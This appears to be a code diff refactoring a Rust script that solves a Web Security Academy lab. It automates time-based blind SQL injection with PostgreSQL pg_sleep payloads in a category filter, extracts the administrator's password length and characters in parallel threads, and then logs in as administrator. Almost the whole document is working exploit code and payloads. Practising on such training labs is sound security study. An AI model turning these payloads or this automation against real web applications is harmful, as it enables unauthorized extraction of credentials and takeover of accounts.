@@ -16,11 +16,11 @@
 *
 ****************************************************************************************/
 #![allow(unused)]
+/***********
+ * Imports
+ ***********/
 use lazy_static::lazy_static;
 use rayon::prelude::{IntoParallelRefIterator, ParallelIterator};
-/***********
-* Imports
-***********/
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
@@ -43,9 +43,8 @@ use text_colorizer::Colorize;
 * Global variables
 *******************/
 lazy_static! {
-    static ref VALID_PASSWORD: Arc<Mutex<String>> =
-        Arc::new(Mutex::new(String::from("                    ")));
-    static ref CHARS_FOUND: AtomicUsize = AtomicUsize::new(0);
+    static ref VALID_PASSWORD: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
+    static ref CHARS_COUNTER: AtomicUsize = AtomicUsize::new(0);
 }
 
 /******************
@@ -53,13 +52,10 @@ lazy_static! {
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0ae20041031e1f53828b488700670037.web-security-academy.net";
+    let url = "https://0a600021044fa844801c177c00ec00fb.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
-    // build the ranges; every range will be executed in different thread
-    // ranges here are hardcoded from 0 to 20 which is the password length
-    // you can make them dynamic or set them to what you want in the function
-    let ranges = build_ranges();
 
     println!(
         "{} {}",
@@ -69,24 +65,36 @@ fn main() {
 
     // determine password length
     let password_length = determine_password_length(&client, url);
+
+    // update the VALID_PASSWORD length
+    VALID_PASSWORD
+        .lock()
+        .unwrap()
+        .push_str(&" ".repeat(password_length as usize));
+
+    // build the ranges
+    // every range will be used in a different thread
+    let mut ranges = build_ranges(0, password_length as i32, 4);
+
     // brute force the password using multiple threads
-    brute_force_password(&client, url, ranges);
+    brute_force_password(&client, url, ranges, password_length);
 
     print!("\n{}", "3. Fetching login page.. ".white());
     io::stdout().flush();
+
     // fetch the login page
     let fetch_login = client
         .get(format!("{url}/login"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch login page".red()));
-    println!("{}", "OK".green());
-    // println!("{:?}", fetch_login.headers());
 
+    println!("{}", "OK".green());
     print!(
         "{}",
         "4. Extracting csrf token and session cookie.. ".white()
     );
     io::stdout().flush();
+
     // extract session cookie
     let session = extract_session_multiple_cookies(fetch_login.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
@@ -94,10 +102,11 @@ fn main() {
     // extract csrf token
     let csrf =
         extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!("{}", "5. Logging in as the administrator.. ".white(),);
     io::stdout().flush();
+
     // login as the administrator
     let admin_login = client
         .post(format!("{url}/login"))
@@ -112,6 +121,7 @@ fn main() {
             "{}",
             "[!] Failed to login as the administrator".red()
         ));
+
     println!("{}", "OK".green());
 
     // extract the new session
@@ -120,9 +130,10 @@ fn main() {
         "[!] Failed to extract new session cookie".red()
     ));
 
-    // fetch administrator page
     print!("{}", "6. Fetching the administrator profile.. ".white(),);
     io::stdout().flush();
+
+    // fetch administrator page
     let admin = client
         .get(format!("{url}/my-account"))
         .header("Cookie", format!("session={new_session}"))
@@ -131,8 +142,8 @@ fn main() {
             "{}",
             "[!] Failed to fetch administrator profile".red()
         ));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "🗹 Check your browser, it should be marked now as"
@@ -154,18 +165,16 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/*********************************************************************
+/*****************************************
 * Function used to build a set of ranges
-* Every range will be in one thread
-* Feel free to change the number of vectors and the range in each one
-**********************************************************************/
-fn build_ranges() -> Vec<Vec<i32>> {
-    let mut list = Vec::new();
-    list.push((0..5).collect::<Vec<i32>>());
-    list.push((5..10).collect::<Vec<i32>>());
-    list.push((10..15).collect::<Vec<i32>>());
-    list.push((15..21).collect::<Vec<i32>>());
-    list
+* Every range will be used in one thread
+******************************************/
+fn build_ranges(start: i32, end: i32, range_length: i32) -> Vec<Vec<i32>> {
+    (start..end)
+        .collect::<Vec<i32>>()
+        .chunks(range_length as usize)
+        .map(|x| x.to_owned())
+        .collect::<Vec<Vec<i32>>>()
 }
 
 /********************************************
@@ -224,12 +233,13 @@ fn extract_session_multiple_cookies(headers: &HeaderMap) -> Option<String> {
     }
 }
 
-
 /*******************************************
 * Function to determine password length
 ********************************************/
-fn determine_password_length(client: &Client, url: &str) -> usize {
+fn determine_password_length(client: &Client, url: &str) -> i32 {
+    // variable that will hold the correct length
     let mut length = 0;
+
     for i in 1..50 {
         print!(
             "\r{} {}",
@@ -237,13 +247,16 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
             i.to_string().yellow()
         );
         io::stdout().flush();
+
         // payload to determine password length
         let payload = format!(
             "' || (SELECT CASE WHEN length((select password from users where username = 'administrator')) = {} THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",
             i
         );
+
         // capture the time before sending the request
         let start_time = time::Instant::now();
+
         // fetch the page with the injected payload
         let injection = client
             .get(format!("{url}/filter?category=Pets"))
@@ -262,34 +275,43 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
                 "Correct length:".white(),
                 i.to_string().green().bold()
             );
+
+            // correct length
             length = i;
+
             break;
         } else {
             continue;
         }
     }
+
+    // return the correct length
     length
 }
 
 /***********************************
 * Function to brute force password
 ************************************/
-fn brute_force_password(client: &Client, url: &str, ranges: Vec<Vec<i32>>) {
-    // let mut correct_password = String::new();
-    ranges.par_iter().for_each(|subrange| {
-        for position in subrange {
+fn brute_force_password(client: &Client, url: &str, ranges: Vec<Vec<i32>>, length: i32) {
+    // run every range in a different thread
+    ranges.par_iter().for_each(|range| {
+        // iterate over every elements in every range
+        for position in range {
+            // iterate over possible chars
             for character in "0123456789abcdefghijklmnopqrstuvwxyz".chars() {
                 print!(
                     "\r{}",
-                    "2. Brute forcing password ".white(),
+                    "2. Brute forcing password.. ".white(),
                 );
                 io::stdout().flush();
+                
                 // payload to brute force password
                 let payload = format!(
                     "' || (SELECT CASE WHEN substring((select password from users where username = 'administrator'), {}, 1) = '{}' THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",
                     position+1,
                     character
                 );
+                
                 // capture the time before sending the request
                 let start_time = time::Instant::now();
 
@@ -306,13 +328,18 @@ fn brute_force_password(client: &Client, url: &str, ranges: Vec<Vec<i32>>) {
 
                 // if the request take 5 or more than 5 seconds to succeeded
                 if start_time.elapsed().as_secs() >= 5  {
-                    CHARS_FOUND.fetch_add(1, Ordering::Relaxed);
+                    // update the counter
+                    CHARS_COUNTER.fetch_add(1, Ordering::Relaxed);
+                    
+                    // update the valid password with the found char
                     VALID_PASSWORD.lock().unwrap().replace_range(*position as usize..*position as usize +1, &character.to_string());
+                    
                     print!(
                         "({}%): {}",
-                        ((CHARS_FOUND.fetch_add(0, Ordering::Relaxed) as f32 / 20.0) * 100.0) as i32,
+                        ((CHARS_COUNTER.fetch_add(0, Ordering::Relaxed) as f32 / length as f32) * 100.0) as i32,
                         VALID_PASSWORD.lock().unwrap().green().bold()
                     );
+                    
                     break;
                 } else {
                     continue;
